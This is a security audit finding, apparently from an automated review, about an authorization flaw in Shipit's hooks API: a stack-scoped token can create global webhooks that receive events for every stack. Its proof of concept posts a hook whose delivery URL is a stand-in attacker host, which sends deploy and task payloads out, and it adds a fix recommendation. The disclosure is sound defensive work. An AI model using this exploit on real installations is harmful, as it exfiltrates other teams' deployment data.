### Title
Stack-scoped ApiClient can create a global webhook and receive events for every stack - ([File: app/controllers/shipit/api/hooks_controller.rb])

### Summary
`ApiClient` records can be scoped to a single `Stack` via `stack_id`, and this scoping is meant to be the authorization boundary for that token: the stack a token is authorized for should be the only stack it can act on. `Shipit::Api::HooksController`, however, only enforces this scope when a `stack_id` route parameter is present. When it is absent (the top-level, non-nested hooks endpoint), the controller falls back to `Hook.where(stack_id: nil)` — the *global* hook scope — without ever consulting `current_api_client.stack_id`. A token scoped to one stack but holding the generic `write:hook`/`read:hook` permission can therefore create or read hooks that receive events for **every** stack in the installation, not just the one it was authorized for.

### Finding Description
`ApiClient#stack_id?` is the intended authorization boundary: `BaseController#stacks` restricts the visible stack set to `Stack.where(id: current_api_client.stack_id)` when the client is scoped [1](#0-0) . That scoping, however, is only applied through `stack`/`stacks`, which are only invoked when a `stack_id` route param exists.

`Api::HooksController` computes the query scope for hooks independently of that mechanism: [2](#0-1) 
When `params[:stack_id]` is blank, `stack_id` returns `nil`, and `hooks` becomes `Hook.where(stack_id: nil)` — i.e. the set of **global** hooks, defined in the model as: [3](#0-2) .

Permission enforcement for this controller only checks the flat permission string, not the client's stack scope: [4](#0-3)  and `ApiClient#check_permissions!` merely tests membership in the `permissions` array — it has no notion of `stack_id` at all: [5](#0-4) . Nothing in `ApiClient`'s validations couples `write:hook`/`read:hook` to `stack_id` being unset, so a client record can legally have both a `stack_id` and hook permissions: [6](#0-5) .

Global hooks are delivered for events on **any** stack, because `Hook.deliver` selects `for_stack(stack_id)`, which explicitly includes `stack_id: nil` rows alongside the specific stack: [7](#0-6) .

**Binding broken:** `current_api_client.stack_id` (the stack a token is authorized for) ≠ the stack(s) whose events a hook created by that token actually touches. A token scoped to stack A can create a global hook whose `deliver!` job fires for stack B, C, D, … carrying `deploy`, `task`, `rollback`, `commit_status`, and `pull_request` payloads (potentially including output/log links) for stacks the token was never granted access to.

### Impact Explanation
This is a cross-stack authorization escalation via a legitimately-issued, narrowly-scoped API token: instead of being confined to reading/writing hooks for its own stack, the token can register a delivery endpoint (attacker-controlled URL) that receives event payloads — including deploy/task/rollback metadata and links to output — for every other stack managed by the Shipit instance. This matches the "unauthenticated/unauthorized read of stack state, task streams or deploy output" and cross-stack-write impact categories: it is an unauthorized write (hook creation) whose effect is unauthorized read (event/output exfiltration) across stacks outside the token's granted scope.

### Likelihood Explanation
Requires only a valid, already-issued `ApiClient` token that has `write:hook` (or `read:hook`) permission and a `stack_id` set — a configuration that is not prevented by validation and is plausible for legitimate scoped-integration tokens (e.g., CI or notification integrations meant to be limited to one stack). No additional privilege beyond normal API authentication is needed; the exploit is a single `POST` to the top-level hooks endpoint omitting `stack_id`.

### Recommendation
In `Api::HooksController`, reject requests to manage global hooks (`stack_id` absent) unless the authenticated `current_api_client` is unscoped (`current_api_client.stack_id.nil?`), or otherwise scope the `hooks` query/creation to `current_api_client.stack_id` whenever the client is stack-restricted, regardless of whether `params[:stack_id]` was supplied. Additionally, consider coupling `ApiClient` validations so that `write:hook`/`read:hook` permissions cannot coexist with a non-nil `stack_id` unless explicitly intended, and ensure `check_permissions!` is stack-aware for endpoints that can straddle the global/scoped boundary.

### Proof of Concept
1. As an admin, create an `ApiClient` scoped to `Stack A` (`stack_id` set) with permissions `['write:hook']` (e.g., via `POST /stacks/A/.../api_clients` or the `api_clients` UI, similar to the fixtures in `test/fixtures/shipit/api_clients.yml` where `here_come_the_walrus` is stack-scoped).
2. Using that client's `authentication_token`, call the top-level hooks endpoint without a `stack_id` segment:
   `POST /api/hooks` with `Authorization: Basic <token>` and body `{"delivery_url":"https://attacker.example.com/collect","events":["deploy","task","rollback","pull_request"]}`.
3. Because `hooks_controller.rb#stack_id` returns `nil` (no `params[:stack_id]`), the hook is created with `stack_id: nil`, i.e. global.
4. Any deploy/task/rollback/pull_request event on any stack in the Shipit instance (not just Stack A) will now be POSTed by `DeliverHookJob` to the attacker's URL, per `Hook.deliver`'s `for_stack` scope including global hooks.

```ruby
    scope :global, -> { where(stack_id: nil) }
    scope :scoped_to, ->(stack) { where(stack_id: stack.id) }
    scope :for_stack, ->(stack_id) { where(stack_id: [nil, stack_id]) }

    class << self
      def emit(event, stack, payload)
        raise "#{event} is not declared in Shipit::Hook::EVENTS" unless EVENTS.include?(event.to_s)

        Shipit::EmitEventJob.perform_later(
          event: event.to_s,
          stack_id: stack&.id,
          payload: coerce_payload(payload)
        )
        deliver_internal_hooks(event, stack, payload)
      end

      def deliver_internal_hooks(event, stack, payload)
        Shipit.internal_hook_receivers.each do |receiver|
          receiver.deliver(event, stack, payload)
        end
      end

      def deliver(event, stack_id, payload)
        for_stack(stack_id).listening_event(event).each do |hook|
          hook.deliver!(event, payload)
        end
      end
```
